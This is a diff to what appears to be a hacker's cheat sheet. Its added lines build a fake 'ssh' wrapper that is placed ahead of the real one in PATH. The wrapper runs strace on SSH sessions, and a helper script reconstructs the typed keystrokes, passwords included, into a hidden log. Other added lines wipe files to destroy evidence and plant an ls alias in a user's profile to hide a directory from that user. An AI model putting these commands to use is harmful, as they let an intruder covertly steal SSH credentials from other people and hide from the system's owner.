@@ -77,14 +77,29 @@ Create a wrapper script called 'ssh' that executes strace + ssh to log the sessi
 ```
 # Add ~/.ssh to the execution PATH variable so our 'ssh' is executed instead of the real ssh:
 $ echo '$PATH=~/.local/bin:$PATH' >>~/.profile
+
 # Create our log directory and our own ssh binary
 $ mkdir ~/.ssh/.logs
 $ mkdir -p ~/.local/bin ~/.ssh/logs
+
 $ cat >~/.local/bin/ssh
 #! /bin/bash
-strace -e trace=read -o ~/.ssh/.logs/ssh-$$-`date +%s`.txt /usr/bin/ssh $@
+strace -e trace=read -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh $@
 # now press CTRL-d to close the file.
-$ chmod 755 ~/.local/bin/ssh
+
+$ cat ~/.local/bin/ssh-log
+#! /bin/bash
+grep 'read(4' | cut -f2 -d\" | while read -r x; do
+        if [ ${#x} -ne 2 ] && [ ${#x} -ne 1 ]; then continue; fi
+        if [ x"${x}" == "x\\n" ] || [ x"${x}" == "x\\r" ]; then
+                echo ""
+        else
+                echo -n "${x}"
+        fi
+done >~/.ssh/.logs/ssh-log-"${1}"-`date +%s`.txt
+# now press CTRL-d to close the file
+
+$ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
 ```
 
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
@@ -201,8 +216,18 @@ $ shred -z foobar.txt
 ```
 $ FNAME=foobar.txt; dd bs=1k count="`du -sk \"${FNAME}\" | cut -f1`" if=/dev/urandom >"${FILENAME}"; rm -f "${FNAME}"
 ```
-Note: Or deploy your files in /dev/shm directory so that no data is written to the harddrive. Wont survive a reboot.
+Note: Or deploy your files in */dev/shm* directory so that no data is written to the harddrive. Data will be deleted on reboot.
+
 Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.
+
+**16. Hide files as User from that User**
+
+```
+alias ls='ls -I SecretDirectory'
+```
+
+This will hide the directory *SecretDirectory* from the *ls* command. Place in user's *~/.profile*.
+
 
 --------------------------------------------------------------------------
 Shoutz: ADM
